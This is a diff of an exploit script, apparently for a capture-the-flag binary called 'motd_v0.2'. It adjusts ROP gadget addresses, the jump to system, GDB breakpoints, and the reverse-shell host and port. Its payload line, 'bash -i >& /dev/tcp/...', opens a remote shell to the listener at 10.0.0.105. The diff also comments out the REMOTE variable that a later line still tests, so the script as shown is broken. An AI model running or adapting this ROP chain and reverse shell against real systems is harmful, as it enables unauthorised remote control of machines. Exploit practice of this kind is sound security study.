@@ -49,25 +49,23 @@ Explanation:
         | ...           |
 """
 
-REMOTE = False              # TARGET is ip:port
+# REMOTE = ('127.0.0.1', 3002)
 TARGET = '../bin/motd_v0.2' # Binary path (local)
-LHOST  = "127.0.0.1"        # Reverse shell host
-LPORT  = "8889"             # Reverse shell port
-DEBUG  = False              # Follow along in GDB
+LHOST  = "10.0.0.105"       # Reverse shell host
+LPORT  = "8888"             # Reverse shell port
+DEBUG  = True               # Follow along in GDB
 
-PIVOT  = 0x401763 # ROPGadget.py --binary motd_v0.2 | grep 'pop rdi' # pop rdi; ret
-SYSTEM = 0x401606 # main+54 jumps to system for us => Doesn't matter if libc is ASLR.
-PAYLOAD = "bash -i >& /dev/tcp/127.0.0.1/8889 0>&1\x00"
+PIVOT  = 0x4017b3 # ROPGadget.py --binary motd_v0.2 | grep 'pop rdi' # pop rdi; ret
+SYSTEM = 0x401652 # main jumps to system for us => Doesn't matter if libc is ASLR.
+PAYLOAD = "bash -i >& /dev/tcp/{}/{} 0>&1\x00".format(LHOST, LPORT)
 
 if not DEBUG:
-    p = process(TARGET) if not REMOTE else remote(TARGET)
+    p = process(TARGET) if REMOTE is None else remote(*REMOTE)
 else: # Follow along in GDB
-    p = gdb.debug(BIN, '''
+    p = gdb.debug(TARGET, '''
             set follow-fork-mode parent
-            break *0x40151c
-            break *0x401508
-            break rate_motd
-            continue
+            b *0x401528
+            b system
     ''')
 
 # Set motd to the rop-chain
